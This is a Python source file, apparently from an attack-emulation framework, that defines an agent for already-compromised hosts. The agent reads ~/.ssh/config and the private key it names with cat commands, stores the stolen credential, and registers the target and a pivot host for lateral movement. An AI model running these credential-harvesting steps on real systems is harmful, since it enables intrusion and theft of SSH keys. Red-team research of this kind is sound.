from incalmo.core.models import Credential
from incalmo.core.actions.low_level import CommandRunner
from .base_agent import BaseAgent


class FindInfoAgent(BaseAgent):
    """
    FindInformation task agent.

    Runs on an already-compromised host (via a CommandRunner that can execute
    commands there) and looks for SSH credentials the way an attacker would:
    read the SSH client config to learn where a key opens, then read the key
    file. Any credential found is written into the environment state service.
    """

    def run(self, runner: CommandRunner, found_on_host: str) -> dict:
        # 1. Read the SSH client config to discover target host / user / key path.
        config_text = runner.run("cat ~/.ssh/config")
        target_host = self._field(config_text, "HostName")
        target_user = self._field(config_text, "User")
        key_path = self._field(config_text, "IdentityFile") or "~/.ssh/id_rsa"

        # 2. Read the private key file the config points to.
        private_key = runner.run(f"cat {key_path}")

        if not private_key or "PRIVATE KEY" not in private_key:
            return self._failure(
                f"No SSH private key found on {found_on_host}",
                {"config": config_text},
            )

        # 3. Record the credential in the environment state service.
        cred = Credential(
            username=target_user or "unknown",
            ssh_key=private_key,
            found_on_host=found_on_host,
            found_at_path=key_path,
            can_access_hosts=[target_host] if target_host else [],
        )
        self.env_service.add_credential(cred)

        # 4. Register the target host AND the pivot in the target's subnet so
        #    the attack graph can route attacker → pivot → target.
        if target_host:
            import ipaddress
            matched = False
            for subnet in self.env_service.get_subnets():
                try:
                    if ipaddress.ip_address(target_host) in ipaddress.ip_network(subnet.cidr, strict=False):
                        self.env_service.add_host_to_subnet(target_host, subnet.cidr)
                        self.env_service.add_host_to_subnet(found_on_host, subnet.cidr)
                        matched = True
                        break
                except ValueError:
                    pass

            if not matched:
                # Target is on a subnet not yet seeded — infer a /24 and create it
                inferred_cidr = str(ipaddress.ip_network(f"{target_host}/24", strict=False))
                self.env_service.add_initial_subnet(inferred_cidr, is_external=False)
                self.env_service.add_host_to_subnet(target_host, inferred_cidr)
                self.env_service.add_host_to_subnet(found_on_host, inferred_cidr)

            # Add a stub host entry so the target can be marked compromised later
            if self.env_service.get_host(target_host) is None:
                from incalmo.core.models import Host
                self.env_service.add_host(Host(ip=target_host))

        return self._success(
            f"Found SSH key for {target_user}@{target_host} on {found_on_host}",
            {"username": target_user, "can_access": target_host, "found_at": key_path},
        )

    def _field(self, config_text: str, name: str) -> str:
        """Pull a value out of an ssh_config line like '    HostName 192.168.1.100'."""
        for line in config_text.splitlines():
            parts = line.split()
            if len(parts) >= 2 and parts[0].lower() == name.lower():
                return parts[1]
        return ""